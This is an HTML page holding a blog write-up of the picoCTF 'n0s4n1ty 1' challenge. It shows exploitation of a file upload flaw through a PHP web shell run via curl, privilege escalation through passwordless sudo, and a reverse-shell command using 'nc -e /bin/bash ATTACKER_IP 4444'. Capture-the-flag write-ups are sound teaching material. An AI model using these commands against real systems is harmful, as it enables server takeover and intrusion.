@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>picoCTF n0s4n1ty Writeup | Web Exploitation | gr4ktung</title>
+    <meta name="description" content="Deep dive into the picoCTF n0s4n1ty challenge. Step-by-step exploitation of web vulnerabilities by gr4ktung.">
+    <link rel="stylesheet" href="../../style.css">
+</head>
+<body>
+    <div class="cyber-grid"></div>
+
+    <nav>
+        <div class="logo"><a href="../../../index.html">gr4ktung</a></div>
+        <div class="nav-links">
+            <a href="../../../about.html">~/about</a>
+            <a href="../../../blog.html" class="active">~/posts</a>
+            <a href="../../../achievements.html">~/achievements</a>
+        </div>
+    </nav>
+
+    <main>
+        <div class="writeup-layout">
+            
+            <aside class="sidebar">
+                <h4>MISSION_BRIEF</h4>
+                <div class="intel-grid">
+                    <div class="detail-box">
+                        <span class="label">Target</span>
+                        <span class="value">picoCTF</span>
+                    </div>
+                    <div class="detail-box">
+                        <span class="label">Category</span>
+                        <span class="value">Web Exploit</span>
+                    </div>
+                    <div class="detail-box">
+                        <span class="label">Author</span>
+                        <span class="value">gr4ktung</span>
+                    </div>
+                    <div class="detail-box">
+                        <span class="label">Date</span>
+                        <span class="value">May 13, 2025</span>
+                    </div>
+                </div>
+                
+                <div style="margin-top: 20px;">
+                    <span class="tag">File Upload</span>
+                    <span class="tag">RCE</span>
+                    <span class="tag">PHP</span>
+                    <span class="tag">PrivEsc</span>
+                </div>
+            </aside>
+
+            <article class="blog-content">
+                <h1>picoCTF: n0s4n1ty 1</h1>
+                <div class="blog-meta">
+                    > Published: May 13, 2025 | ⏱ 3 min read | Author: gr4ktung
+                </div>
+
+                <h3>Challenge Description</h3>
+                <p>A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the <code>/root</code> directory.</p>
+
+                <hr style="border: none; border-top: 1px solid rgba(255,255,255,0.05); margin: 30px 0;">
+
+                <h3>Solution</h3>
+                <p>This is my first web challenge walkthrough, and I’ll be explaining my thought process step by step. The goal of this walkthrough is to not only show how I solved the challenge but also to help others understand the methodology behind web exploitation.</p>
+                
+                <p>This is the challenge:</p>
+                <img src="../picoctf/images/nosanity01.webp" alt="Challenge Interface" class="content-img">
+                
+                <p>Accessing the challenge on the browser:</p>
+                <img src="../picoctf/images/nosanity02.webp" alt="Challenge Interface" class="content-img">
+
+                <p>Looking at the webpage, the challenge seems to be a file upload vulnerability, commonly referred to as Unrestricted File Upload or Arbitrary File Upload. This allows users to upload files without proper validation or security controls, potentially leading to remote code execution (RCE), defacement, or other attacks.</p>
+                
+                <p>I tried uploading a file that is not an image file and the upload was successful, so the upload section was not validated to only allow image files to be uploaded. So it wasn't necessary to bypass extension restrictions.</p>
+
+                <p>I crafted a simple Remote Code Execution (RCE) payload often used in file upload vulnerabilities. This script takes input from the URL parameter <code>cmd</code> and executes it on the server using the <code>system()</code> function. I saved it as <code>exploit.php</code>:</p>
+                
+                <img src="../picoctf/images/nosanity03.webp" alt="Challenge Interface" class="content-img">
+
+                <p>After uploading the file, the website gives a URL path that can be used to access the file, which was an easy way out...</p>
+
+                <img src="../picoctf/images/nosanity04.webp" alt="Challenge Interface" class="content-img">
+
+                <p>Now I had to access the file, remembering it was a scripted payload. So I accessed the file using this path so that I can execute commands:</p>
+                
+                <div class="command-block">curl http://standard-pizzas.picoctf.net:56275/uploads/exploit.php?cmd=whoami</div>
+
+                <p><strong>OR</strong> you can use this payload to get a reverse shell:</p>
+                <div class="command-block">curl http://standard-pizzas.picoctf.net:56275/uploads/exploit.php?cmd=nc -e /bin/bash ATTACKER_IP 4444</div>
+
+                <p>It gives the response:</p>
+                <img src="../picoctf/images/nosanity05.webp" alt="Challenge Interface" class="content-img">
+
+                <p>So I had to check the sudo privileges of the user <code>www-data</code> and got a response which showed a critical privilege escalation vulnerability where the user <code>www-data</code> can run any command as root without a password:</p>
+
+                <img src="../picoctf/images/nosanity06.webp" alt="Challenge Interface" class="content-img">
+
+                <p>I saw it was easy at this point because I knew the flag was in the root directory as the challenge description says. I first tried to list the files in the root directory and I was getting no response... then realized I had to use the command with sudo. Hence I arrived at this:</p>
+
+                <div class="command-block">curl "http://standard-pizzas.picoctf.net:56275/uploads/exploit.php?cmd=sudo ls -a /root"</div>
+
+                <img src="../picoctf/images/nosanity07.webp" alt="Challenge Interface" class="content-img">
+
+                <p>Then the obvious one, I just had to read the flag so I used this:</p>
+
+                <div class="command-block">curl "http://standard-pizzas.picoctf.net:56275/uploads/exploit.php?cmd=sudo cat /root/flag.txt"</div>
+
+                <img src="../picoctf/images/nosanity08.webp" alt="Challenge Interface" class="content-img">
+
+                <div style="text-align: center;">
+                    <div class="flag-block">picoCTF{wh47_c4n_u_d0_wPHP_80eedb7d}</div>
+                </div>
+
+                <p style="color: #888; font-size: 0.85rem; text-align: center;">
+                    <em>P.S: Do not copy paste the flag; the last part of the flag is unique for every user.</em>
+                </p>
+
+                <div class="post-nav">
+                    <a href="../../../blog.html" class="btn">RETURN_TO_DIR</a>
+                </div>
+            </article>
+
+        </div>
+    </main>
+
+    <footer>
+        <p>sys.exit(0) |Designed by gr4ktung</p>
+    </footer>
+
+    <div class="scroll-controls">
+        <button class="scroll-btn" onclick="window.scrollTo({top: 0, behavior: 'smooth'})">↑</button>
+        <button class="scroll-btn" onclick="window.scrollTo({top: document.body.scrollHeight, behavior: 'smooth'})">↓</button>
+    </div>
+
+</body>
+</html>
